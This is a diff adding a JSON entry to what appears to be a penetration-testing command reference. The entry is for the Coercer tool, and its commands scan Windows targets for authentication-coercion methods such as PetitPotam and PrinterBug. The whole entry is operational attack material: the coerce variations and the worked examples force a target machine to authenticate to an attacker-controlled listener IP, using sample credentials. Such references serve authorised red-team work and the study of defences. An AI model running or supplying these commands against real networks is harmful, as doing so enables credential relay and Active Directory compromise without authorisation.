@@ -1,0 +1,21 @@
+{
+  "id": "coercer-scan",
+  "name": "Coercer Scan (Find Coercion Vectors)",
+  "command": "coercer scan -u '<user>' -p '<password>' -d '<domain>' -t <target>",
+  "description": "Probe a target for every known authentication-coercion RPC method (PetitPotam, PrinterBug, DFSCoerce, MSEven, etc.). Use scan first to confirm which calls succeed before launching coerce.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["rpc", "smb"],
+  "tags": ["coercer", "coercion", "petitpotam", "printerbug", "dfscoerce"],
+  "variations": [
+    { "label": "Coerce All Working Vectors", "requires": "password", "command": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <target> -l <listener-ip>" },
+    { "label": "Specific Method", "requires": "password", "command": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <target> -l <listener-ip> --filter-method-name PetitPotam" }
+  ],
+  "references": [
+    { "title": "Coercer", "url": "https://github.com/p0dalirius/Coercer" }
+  ],
+  "examples": [
+    "coercer scan -u jdoe -p 'Password123!' -d corp.local -t 10.10.10.20",
+    "coercer coerce -u jdoe -p 'Password123!' -d corp.local -t 10.10.10.20 -l 10.10.14.5"
+  ]
+}
